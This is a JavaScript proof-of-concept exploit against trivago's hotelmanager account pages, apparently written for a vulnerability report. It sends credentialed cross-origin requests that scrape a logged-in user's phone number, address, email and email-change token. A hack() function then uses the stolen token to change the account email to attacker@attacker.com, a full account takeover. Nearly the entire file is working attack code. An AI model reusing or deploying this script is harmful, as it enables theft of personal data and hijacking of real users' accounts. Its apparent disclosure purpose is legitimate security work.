

function stealPersonalinfo()
{
	var fetchHash = new XMLHttpRequest();

var url = "https://www.trivago.com/hotelmanager/personal/settings.html";
var datax;
var all_elements;
var vc_phone_number='initial';
var vc_emailId;
var vc_address;

fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   alert('Stole your Phone number '+all_elements[8].value+' ...Tabahi');
					   vc_address = all_elements[6].value+all_elements[7].value;
					   alert('Stole your address '+vc_address+' ...Tabahi');
					   vc_emailId = all_elements[1].value;
					   alert('Stole your email '+vc_emailId+' ...Tabahi');
					   


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}

function stealEmailToken()
{
	var fetchHash = new XMLHttpRequest();

var url = "https://www.trivago.com/hotelmanager/personal/update_email.html";
var datax;
var all_elements;
var vc_email_token='initial';

fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[2].value;
					   alert('Stole your Email change Token: '+vc_email_token+' ...Tabahi');
					   //hack(vc_email_token);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}



stealPersonalinfo();
stealEmailToken();




function hack(emailToken)
{

var HackAccount = new XMLHttpRequest();

url= "https://www.trivago.in/hotelmanager/personal/update_email.html";

HackAccount .open("POST",url, true);

HackAccount .withCredentials=true;

var data= 'AccountEmailForm%5BsEmail%5D%5Bfirst%5D=attacker%40attacker.com&AccountEmailForm%5BsEmail%5D%5Bsecond%5D=attacker%40attacker.com&AccountEmailForm%5B_token%5D='+emailToken ;

HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');

HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
HackAccount .send(data);


}